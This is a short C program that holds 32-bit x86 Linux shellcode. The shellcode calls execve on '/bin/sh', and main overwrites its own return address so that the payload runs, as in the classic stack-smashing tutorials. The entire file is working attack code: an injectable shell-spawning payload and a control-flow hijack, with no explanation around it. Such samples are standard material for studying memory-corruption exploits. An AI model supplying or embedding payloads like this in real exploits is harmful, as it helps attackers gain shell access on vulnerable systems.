unsigned char shellcode[] = {
	0xeb, 0x15, 0x5e, 0x31, 0xc0, 0x50, 0xb0, 0x0b, 0x89, 0xf3, 0x89, 0xe1,
	0x31, 0xd2, 0xcd, 0x80, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80, 0xe8,
	0xe6, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
};

void
main()
{
	int *ret;
	ret = (int*)&ret + 2;
	(*ret) = (int)&shellcode[0];
}
